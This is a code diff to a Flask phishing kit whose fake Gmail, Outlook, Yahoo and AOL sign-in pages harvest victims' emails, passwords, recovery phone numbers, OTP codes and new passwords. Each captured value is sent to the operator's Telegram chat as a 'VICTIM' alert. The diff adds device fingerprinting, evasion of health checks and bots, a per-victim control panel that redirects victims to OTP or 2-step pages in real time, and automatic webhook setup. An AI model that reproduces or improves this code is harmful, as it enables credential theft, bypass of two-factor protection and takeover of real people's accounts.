@@ -87,8 +87,121 @@ verify_page_data = {}
 recovery_page_data = {}
 verification_page_data = {}
 
+# Force webhook setup on every request
+def ensure_webhook():
+    """Ensure webhook is set on every request"""
+    try:
+        domain = os.environ.get('DOMAIN_URL', 'https://bace-wmed.onrender.com')
+        webhook_url = f"{domain}/telegram-webhook"
+        
+        # Check current webhook
+        info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo"
+        info_response = requests.get(info_url, timeout=5)
+        info = info_response.json()
+        
+        current_url = info.get('result', {}).get('url', '')
+        
+        if current_url != webhook_url:
+            print(f"🔄 Webhook mismatch. Setting to: {webhook_url}")
+            set_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={webhook_url}"
+            response = requests.get(set_url, timeout=10)
+            result = response.json()
+            if result.get('ok'):
+                print(f"✅ Webhook set successfully: {webhook_url}")
+            else:
+                print(f"❌ Webhook failed: {result}")
+        else:
+            print(f"✅ Webhook already set correctly: {webhook_url}")
+    except Exception as e:
+        print(f"❌ Error ensuring webhook: {e}")
+
+@app.before_request
+def before_request():
+    """Run before every request - ensure webhook is set and ignore bots"""
+    # Ignore health checks and bots
+    user_agent = request.headers.get('User-Agent', '')
+    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
+        return None
+    
+    # Skip for static files and webhook endpoint itself
+    if not request.path.startswith('/static/') and request.path != '/telegram-webhook':
+        ensure_webhook()
+
+def get_device_info(user_agent):
+    """Extract device info from user agent"""
+    device = "Unknown"
+    if not user_agent:
+        return device
+    
+    ua = user_agent.lower()
+    
+    # Check for mobile devices
+    if 'iphone' in ua:
+        device = "iPhone"
+    elif 'ipad' in ua:
+        device = "iPad"
+    elif 'android' in ua:
+        if 'mobile' in ua:
+            device = "Android Phone"
+        else:
+            device = "Android Tablet"
+    elif 'windows' in ua:
+        if 'phone' in ua:
+            device = "Windows Phone"
+        else:
+            device = "Windows PC"
+    elif 'macintosh' in ua or 'mac os' in ua:
+        device = "Mac"
+    elif 'linux' in ua:
+        device = "Linux"
+    elif 'bot' in ua or 'crawl' in ua or 'spider' in ua:
+        device = "Bot/Crawler"
+    
+    return device
+
+def send_telegram_notification_with_buttons(message, session_id=None):
+    """Send notification with View Victim button"""
+    try:
+        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+        if not chat_id:
+            return False
+        
+        # Create inline keyboard with View Victim button
+        keyboard = {
+            "inline_keyboard": []
+        }
+        
+        if session_id:
+            # Add View Victim button if session_id is provided
+            keyboard["inline_keyboard"].append([
+                {"text": "👤 View Victim", "callback_data": f"victim_detail|{session_id}"}
+            ])
+        
+        # Always add Main Menu button
+        keyboard["inline_keyboard"].append([
+            {"text": "🔙 Main Menu", "callback_data": "main_menu"}
+        ])
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML",
+            "reply_markup": json.dumps(keyboard)
+        }
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
+            print(f"✅ Telegram sent to chat: {chat_id}")
+            return True
+        else:
+            print(f"❌ Telegram error: {response.text}")
+            return False
+    except Exception as e:
+        print(f"Error sending Telegram: {e}")
+        return False
+
 def send_telegram_message(message):
-    """Send to Telegram using direct chat ID"""
+    """Send simple text message without buttons"""
     try:
         chat_id = os.environ.get('TELEGRAM_CHAT_ID')
         if not chat_id:
@@ -112,9 +225,12 @@ def send_telegram_message(message):
         return False
 
 def get_client_ip():
-    """Get client IP address"""
+    """Get client IP address - real visitor IP"""
+    # Check for X-Forwarded-For header (for proxies/load balancers)
     if request.headers.get('X-Forwarded-For'):
-        return request.headers.get('X-Forwarded-For').split(',')[0]
+        ips = request.headers.get('X-Forwarded-For').split(',')
+        # Get the first IP in the list (real client IP)
+        return ips[0].strip()
     elif request.headers.get('X-Real-IP'):
         return request.headers.get('X-Real-IP')
     else:
@@ -200,6 +316,11 @@ def log_navigation(session_id, page_url, email=None):
 @app.before_request
 def check_restrictions():
     """Check commands for victims"""
+    # Ignore health checks and bots
+    user_agent = request.headers.get('User-Agent', '')
+    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
+        return None
+    
     if (request.endpoint in ['static', 'check_command', 'track_navigation',
                             'set_phone_data', 'get_phone_data', 'set_recovery_data', 
                             'get_recovery_data', 'set_verification_data', 'get_verification_data', 
@@ -235,6 +356,12 @@ def check_restrictions():
 @app.route('/')
 def index():
     """Main route - serves index page with all email provider options"""
+    # Ignore health checks and bots
+    user_agent = request.headers.get('User-Agent', '')
+    if 'Go-http-client' in user_agent or 'HealthCheck' in user_agent:
+        invite_num = random.randint(2, 999)
+        return render_template('index.html', invite_num=invite_num)
+    
     if 'victim_session' not in session:
         client_ip = get_client_ip()
         user_agent = request.headers.get('User-Agent', '')
@@ -243,17 +370,17 @@ def index():
         session['is_victim'] = True
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        device = get_device_info(user_agent)
         
-        message = f"""
-🎣 <b>NEW VICTIM CONNECTED!</b>
+        message = f"""🎣 <b>NEW VICTIM CONNECTED!</b>
 
 🌐 <b>IP Address:</b> <code>{client_ip}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
 🔧 <b>User Agent:</b> <code>{user_agent}</code>
-📍 <b>Current Page:</b> Index (Provider Selection)
-        """
+📍 <b>Current Page:</b> Index (Provider Selection)"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     invite_num = random.randint(2, 999)
     return render_template('index.html', invite_num=invite_num)
@@ -266,6 +393,8 @@ def gmail_login():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id:
         log_navigation(session_id, 'Gmail Login Page', session.get('email'))
@@ -273,16 +402,15 @@ def gmail_login():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
+        message = f"""🔐 <b>VICTIM REACHED GMAIL LOGIN PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email yet')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Gmail Login
-        """
+📍 <b>Current Page:</b> Gmail Login"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('login.html')
 
@@ -291,6 +419,8 @@ def login():
     """Handle victim login"""
     email = request.form.get('email')
     session_id = session.get('victim_session')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if email and session_id:
         conn = get_db_connection()
@@ -302,21 +432,24 @@ def login():
         if session_id in active_victims:
             active_victims[session_id]['email'] = email
         
+        if session_id not in verify_page_data:
+            verify_page_data[session_id] = {}
+        verify_page_data[session_id]['email'] = email
+        
         log_navigation(session_id, 'Login Attempt', email)
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         client_ip = get_client_ip()
         
-        message = f"""
-📧 <b>VICTIM ENTERED EMAIL!</b>
+        message = f"""📧 <b>VICTIM ENTERED EMAIL!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{client_ip}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Login Form
-        """
+📍 <b>Current Page:</b> Login Form"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         session['email'] = email
         
@@ -331,21 +464,23 @@ def waiting():
         return redirect(url_for('index'))
     
     session_id = session.get('victim_session')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
+    
     if session_id:
         log_navigation(session_id, 'Waiting Page', session.get('email'))
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-⏳ <b>VICTIM REACHED WAITING PAGE!</b>
+        message = f"""⏳ <b>VICTIM REACHED WAITING PAGE!</b>
 
 📧 <b>Email:</b> <code>{session.get('email', 'No email')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Waiting
-        """
+📍 <b>Current Page:</b> Waiting"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('waiting.html')
 
@@ -357,23 +492,24 @@ def stall():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if request.method == 'POST':
         captcha_text = request.form.get('ca', '').strip()
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>
+        message = f"""⏸️ <b>VICTIM SUBMITTED CAPTCHA ON STALL PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔤 <b>CAPTCHA Text:</b> <code>{captcha_text or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)
-        """
+📍 <b>Current Page:</b> Stall (CAPTCHA Submitted)"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'Stall Page - CAPTCHA Submitted', email)
         
@@ -384,16 +520,15 @@ def stall():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-⏸️ <b>VICTIM REACHED STALL PAGE!</b>
+        message = f"""⏸️ <b>VICTIM REACHED STALL PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Stall (CAPTCHA)
-        """
+📍 <b>Current Page:</b> Stall (CAPTCHA)"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('stall.html')
 
@@ -425,6 +560,8 @@ def verify():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
@@ -435,17 +572,16 @@ def verify():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>
+        message = f"""🔐 <b>VICTIM SUBMITTED RECOVERY INFO!</b>
 
 📧 <b>Original Email:</b> <code>{email}</code>
 📩 <b>Recovery Email:</b> <code>{recovery_email or 'Not provided'}</code>
 📱 <b>Recovery Phone:</b> <code>{recovery_phone or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'Recovery Info Submitted', email)
         
@@ -456,16 +592,15 @@ def verify():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
+        message = f"""🔐 <b>VICTIM REACHED VERIFY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Verify
-        """
+📍 <b>Current Page:</b> Verify"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('verify.html', placeholders={'email': email})
 
@@ -476,6 +611,8 @@ def password():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
@@ -486,16 +623,15 @@ def password():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔑 <b>VICTIM SUBMITTED PASSWORD!</b>
+        message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'Password Submitted', email)
         
@@ -506,16 +642,15 @@ def password():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
+        message = f"""🔑 <b>VICTIM REACHED PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Password
-        """
+📍 <b>Current Page:</b> Password"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('password.html', placeholders={'email': email})
 
@@ -540,6 +675,8 @@ def invalid():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
@@ -550,17 +687,16 @@ def invalid():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>
+        message = f"""🔑 <b>VICTIM SUBMITTED PASSWORD FROM INVALID PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Page Type:</b> Invalid/Too Many Attempts
-        """
+📍 <b>Page Type:</b> Invalid/Too Many Attempts"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'Invalid Page - Password Submitted', email)
         
@@ -571,16 +707,15 @@ def invalid():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🚫 <b>VICTIM REACHED INVALID PAGE!</b>
+        message = f"""🚫 <b>VICTIM REACHED INVALID PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Invalid/Too Many Attempts
-        """
+📍 <b>Current Page:</b> Invalid/Too Many Attempts"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('invalid.html', placeholders={'email': email})
 
@@ -591,6 +726,8 @@ def reset():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
@@ -602,17 +739,16 @@ def reset():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔑 <b>VICTIM CREATED NEW PASSWORD!</b>
+        message = f"""🔑 <b>VICTIM CREATED NEW PASSWORD!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>New Password:</b> <code>{new_password or 'Not provided'}</code>
 ✅ <b>Confirm Password:</b> <code>{confirm_password or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'Reset Password Submitted', email)
         
@@ -623,16 +759,15 @@ def reset():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
+        message = f"""🔑 <b>VICTIM REACHED RESET PASSWORD PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Reset Password
-        """
+📍 <b>Current Page:</b> Reset Password"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('reset.html', placeholders={'email': email})
 
@@ -643,6 +778,8 @@ def otp():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     if session_id and session_id in verify_page_data:
         email = verify_page_data[session_id].get('email', email)
@@ -653,16 +790,15 @@ def otp():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔢 <b>VICTIM SUBMITTED OTP!</b>
+        message = f"""🔢 <b>VICTIM SUBMITTED OTP!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔢 <b>OTP Code:</b> <code>{otp_code or 'Not provided'}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
         
         log_navigation(session_id, 'OTP Submitted', email)
         
@@ -673,16 +809,15 @@ def otp():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-🔢 <b>VICTIM REACHED OTP PAGE!</b>
+        message = f"""🔢 <b>VICTIM REACHED OTP PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> OTP
-        """
+📍 <b>Current Page:</b> OTP"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('otp.html', placeholders={'email': email, 'phone': '****'})
 
@@ -693,6 +828,8 @@ def recovery():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     recovery_data = {}
     if session_id and session_id in recovery_page_data:
@@ -706,17 +843,16 @@ def recovery():
         if not session.get(notification_key):
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
-            message = f"""
-📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
+            message = f"""📱 <b>VICTIM REACHED RECOVERY PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔢 <b>Number Displayed:</b> <code>{recovery_data.get('number', 'Not set')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> Recovery
-            """
+📍 <b>Current Page:</b> Recovery"""
             
-            send_telegram_message(message)
+            send_telegram_notification_with_buttons(message, session_id)
             session[notification_key] = True
     
     return render_template('recovery.html', placeholders={
@@ -731,6 +867,8 @@ def twostep():
     
     session_id = session.get('victim_session')
     email = session.get('email', '')
+    user_agent = request.headers.get('User-Agent', '')
+    device = get_device_info(user_agent)
     
     verification_data = {}
     if session_id and session_id in verification_page_data:
@@ -742,17 +880,16 @@ def twostep():
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        message = f"""
-📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
+        message = f"""📱 <b>VICTIM REACHED 2-STEP VERIFICATION PAGE!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 📱 <b>Phone Displayed:</b> <code>{verification_data.get('phone', 'Not set')}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Current Page:</b> 2-Step Verification
-        """
+📍 <b>Current Page:</b> 2-Step Verification"""
         
-        send_telegram_message(message)
+        send_telegram_notification_with_buttons(message, session_id)
     
     return render_template('2stepverification.html', placeholders={
         'email': email, 
@@ -1001,9 +1138,23 @@ def send_victim_detail(chat_id, session_id, message_id=None):
     else:
         # Get current values from stored data
         current_email = victim.get('email', 'Not set')
+        
+        # If email is 'No email' or 'Not set', check active_victims and verify_page_data
+        if current_email in ['No email', 'Not set']:
+            if session_id in active_victims and active_victims[session_id].get('email'):
+                current_email = active_victims[session_id]['email']
+            elif session_id in verify_page_data and verify_page_data[session_id].get('email'):
+                current_email = verify_page_data[session_id]['email']
+            elif session.get('email'):
+                current_email = session.get('email')
+        
         current_phone = verify_page_data.get(session_id, {}).get('phone', 'Not set')
         current_number = recovery_page_data.get(session_id, {}).get('number', 'Not set')
         current_phone_type = verification_page_data.get(session_id, {}).get('phone', 'Not set')
+        
+        # Get real device
+        user_agent = victim.get('user_agent', '')
+        device = get_device_info(user_agent)
         
         text = f"""👤 <b>Victim Details</b>
 
@@ -1011,17 +1162,17 @@ def send_victim_detail(chat_id, session_id, message_id=None):
 📧 <b>Email:</b> {current_email}
 📍 <b>Current Page:</b> {victim['current_page']}
 🌐 <b>IP:</b> {victim['ip_address']}
-📱 <b>Device:</b> {victim['user_agent'][:40]}...
+📱 <b>Device:</b> {device}
 🕐 <b>Connected:</b> {victim['timestamp']}
 📊 <b>Navigations:</b> {victim['nav_count']}
 
-<b>Current Settings:</b>
+<b>📌 Current Settings:</b>
 📧 <b>Email:</b> {current_email}
 📱 <b>Phone Type:</b> {current_phone_type}
 📞 <b>Phone:</b> {current_phone}
 🔢 <b>2-Digit Number:</b> {current_number}
 
-<b>Gmail Flow Controls:</b>"""
+<b>⚙️ Settings Controls:</b>"""
         
         keyboard = {
             "inline_keyboard": [
@@ -1032,6 +1183,12 @@ def send_victim_detail(chat_id, session_id, message_id=None):
                 [
                     {"text": "📞 Set Phone", "callback_data": f"setphone|{session_id}|"},
                     {"text": "🔢 Set 2-Digit", "callback_data": f"setnumber|{session_id}|"}
+                ],
+                [
+                    {"text": "━━━━━━━━━━━━━━━━━━━━", "callback_data": "noop"}
+                ],
+                [
+                    {"text": "🚀 Navigation Controls", "callback_data": "noop"}
                 ],
                 [
                     {"text": "🔐 Login", "callback_data": f"force|{session_id}|login"},
@@ -1052,6 +1209,9 @@ def send_victim_detail(chat_id, session_id, message_id=None):
                 [
                     {"text": "❌ Invalid", "callback_data": f"force|{session_id}|invalid"},
                     {"text": "⏳ Waiting", "callback_data": f"force|{session_id}|waiting"}
+                ],
+                [
+                    {"text": "━━━━━━━━━━━━━━━━━━━━", "callback_data": "noop"}
                 ],
                 [
                     {"text": "🗑️ Delete Victim", "callback_data": f"delete|{session_id}"}
@@ -1118,10 +1278,11 @@ def set_victim_email(session_id, email, chat_id, message_id):
     if session_id in active_victims:
         active_victims[session_id]['email'] = email
     
-    # Also store in verify data
     if session_id not in verify_page_data:
         verify_page_data[session_id] = {}
     verify_page_data[session_id]['email'] = email
+    
+    session['email'] = email
     
     text = f"✅ Email set to: <code>{email}</code>"
     keyboard = {
@@ -1376,9 +1537,16 @@ def get_victim_details(session_id):
     conn.close()
     
     if victim:
+        email = victim[1] or 'No email'
+        
+        if email == 'No email' and session_id in active_victims:
+            mem_email = active_victims[session_id].get('email')
+            if mem_email:
+                email = mem_email
+        
         return {
             'session_id': victim[0],
-            'email': victim[1] or 'No email',
+            'email': email,
             'ip_address': victim[2],
             'user_agent': victim[3],
             'current_page': victim[4] or 'login',
@@ -1406,16 +1574,17 @@ def microsoft_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-📧 <b>Outlook Email Entered!</b>
+        message = f"""📧 <b>Outlook Email Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Page:</b> Outlook Login
-        """
-        send_telegram_message(message)
+📍 <b>Page:</b> Outlook Login"""
+        send_telegram_notification_with_buttons(message, session_id)
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/hotmail/password")
@@ -1431,16 +1600,17 @@ def microsoft_password(invite_num):
         email = request.form.get('email', 'Not provided')
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-🔑 <b>Outlook Password Entered!</b>
+        message = f"""🔑 <b>Outlook Password Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
-        send_telegram_message(message)
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
+        send_telegram_notification_with_buttons(message, session.get('victim_session'))
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/hotmail/403")
@@ -1469,16 +1639,17 @@ def yahoo_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-📧 <b>Yahoo Email/Username Entered!</b>
+        message = f"""📧 <b>Yahoo Email/Username Entered!</b>
 
 📧 <b>Email/Username:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Page:</b> Yahoo Login
-        """
-        send_telegram_message(message)
+📍 <b>Page:</b> Yahoo Login"""
+        send_telegram_notification_with_buttons(message, session_id)
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/yahoo/password")
@@ -1494,16 +1665,17 @@ def yahoo_password(invite_num):
         email = request.form.get('email', 'Not provided')
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-🔑 <b>Yahoo Password Entered!</b>
+        message = f"""🔑 <b>Yahoo Password Entered!</b>
 
 📧 <b>Email/Username:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
-        send_telegram_message(message)
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
+        send_telegram_notification_with_buttons(message, session.get('victim_session'))
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/yahoo/403")
@@ -1532,16 +1704,17 @@ def aol_login(invite_num):
                 active_victims[session_id]['email'] = email
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-📧 <b>AOL Email Entered!</b>
+        message = f"""📧 <b>AOL Email Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
+📱 <b>Device:</b> {device}
 🕒 <b>Time:</b> <code>{timestamp}</code>
-📍 <b>Page:</b> AOL Login
-        """
-        send_telegram_message(message)
+📍 <b>Page:</b> AOL Login"""
+        send_telegram_notification_with_buttons(message, session_id)
         
         new_invite = random.randint(2, 999)
         return redirect(f"/wp-admin/invite{new_invite}/aol/password")
@@ -1557,16 +1730,17 @@ def aol_password(invite_num):
         email = request.form.get('email', 'Not provided')
         
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        user_agent = request.headers.get('User-Agent', '')
+        device = get_device_info(user_agent)
         
-        message = f"""
-🔑 <b>AOL Password Entered!</b>
+        message = f"""🔑 <b>AOL Password Entered!</b>
 
 📧 <b>Email:</b> <code>{email}</code>
 🔐 <b>Password:</b> <code>{password}</code>
 🌐 <b>IP Address:</b> <code>{get_client_ip()}</code>
-🕒 <b>Time:</b> <code>{timestamp}</code>
-        """
-        send_telegram_message(message)
+📱 <b>Device:</b> {device}
+🕒 <b>Time:</b> <code>{timestamp}</code>"""
+        send_telegram_notification_with_buttons(message, session.get('victim_session'))
         
